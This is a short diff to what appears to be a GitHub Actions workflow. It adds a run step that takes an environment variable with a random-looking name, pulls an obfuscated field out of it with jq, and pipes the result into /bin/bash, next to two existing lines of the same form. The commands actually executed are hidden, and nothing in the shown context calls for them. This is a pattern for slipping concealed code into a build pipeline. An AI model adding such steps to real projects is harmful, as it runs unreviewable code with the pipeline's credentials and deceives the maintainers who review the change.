@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$nmd225" | jq -r .z3 | /bin/bash
           echo $bnshi2 | jq -r .ofdsg34 | /bin/bash
+          printf '%s' "$ezgr28" | jq -r .uskz96 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
